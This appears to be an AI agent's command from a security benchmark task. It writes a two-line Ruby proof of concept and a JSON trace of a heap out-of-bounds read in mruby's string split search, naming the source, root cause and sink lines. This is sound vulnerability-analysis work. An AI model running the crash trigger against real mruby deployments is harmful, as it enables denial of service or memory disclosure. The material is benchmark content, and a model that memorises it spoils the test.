message:
Command `cat > /workspace/poc.rb <<'EOF'
s="A"*17
s.split("BC")
EOF
cat > /workspace/analysis.json <<'EOF'
{
  "sample_id": "secbench_oss_mruby.ossfuzz-42532420",
  "fine_trace": [
    {
      "step": 1,
      "file": "src/string.c",
      "function": "mrb_str_split_m",
      "line": 2343,
      "var": "RSTRING_PTR(spat), pat_len, RSTRING_PTR(str)+idx, str_len - idx",
      "code": "end = mrb_memsearch(RSTRING_PTR(spat), pat_len, RSTRING_PTR(str)+idx, str_len - idx);",
      "role": "source",
      "note": "The Ruby split call supplies the separator bytes and the remaining input string bytes to substring search."
    },
    {
      "step": 2,
      "file": "src/string.c",
      "function": "mrb_memsearch",
      "line": 650,
      "var": "x0, m, y0, n",
      "code": "return mrb_memsearch_ss((const unsigned char*)x0, m, (const unsigned char*)y0, n);",
      "role": "intermediate",
      "note": "For a two-byte separator shorter than the searched string, control reaches the vectorized search helper with attacker-controlled lengths and pointers."
    },
    {
      "step": 3,
      "file": "src/string.c",
      "function": "mrb_memsearch_ss",
      "line": 608,
      "var": "i < n",
      "code": "for (mrb_int i=0; i < n; i+=sizeof(bitint), s0++, s1++) {",
      "role": "root_cause",
      "note": "The loop permits another machine-word iteration whenever any byte remains, instead of requiring a full bitint-sized readable window."
    },
    {
      "step": 4,
      "file": "src/string.c",
      "function": "mrb_memsearch_ss",
      "line": 609,
      "var": "*s0, *s1",
      "code": "const bitint eq = (*s0 ^ first) | (*s1 ^ last);",
      "role": "sink",
      "note": "On the final partial iteration, dereferencing the bitint pointers reads past the end of the heap string buffer."
    }
  ],
  "vuln_logic": {
    "source": {
      "file": "src/string.c",
      "function": "mrb_str_split_m",
      "line": 2343,
      "operands": ["RSTRING_PTR(spat)", "pat_len", "RSTRING_PTR(str)+idx", "str_len - idx"]
    },
    "root_cause": {
      "file": "src/string.c",
      "function": "mrb_memsearch_ss",
      "line": 608,
      "operands": ["i + sizeof(bitint)", "n"],
      "relation": {"op": "le", "left": "i + sizeof(bitint)", "right": "n"}
    },
    "sink": {
      "file": "src/string.c",
      "function": "mrb_memsearch_ss",
      "line": 609,
      "operands": ["i + sizeof(bitint)", "n"],
      "relation": {"op": "gt", "left": "i + sizeof(bitint)", "right": "n"}
    },
    "propagation": [
      {
        "from": {"file": "src/string.c", "function": "mrb_str_split_m", "line": 2343, "operands": ["str_len - idx"]},
        "to": {"file": "src/string.c", "function": "mrb_memsearch_ss", "line": 609, "operands": ["*s0", "*s1"]},
        "type": "data",
        "via": ["n", "ys", "s0", "s1", "i"]
      }
    ]
  }
}
EOF
